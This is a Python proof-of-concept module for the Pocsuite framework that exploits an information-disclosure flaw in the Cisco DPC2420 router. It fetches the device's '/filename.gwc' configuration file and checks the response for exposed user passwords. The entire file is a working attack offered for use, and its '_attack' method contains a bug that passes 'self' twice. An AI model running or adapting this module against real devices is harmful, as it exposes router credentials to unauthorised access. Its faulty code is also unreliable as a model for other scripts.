#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register


class TestPOC(POCBase):
    name = "Cisco DPC2420 Info Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Password Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/23250/'
    desc = 'Module exploits Cisco DPC2420 information disclosure vulnerability which allows reading sensitive information from the configuration file.'


    vulDate = ''
    createDate = '2017-10-16'
    updateDate = '2017-10-16'

    appName = 'Cisco'
    appVersion = 'DPC2420'
    dork = ''
    appPowerLink = 'http://www.cisco.com/'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/filename.gwc'
        resp = req.get(url)
        if resp.status_code == 200 and "User Password" in resp.content:

            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
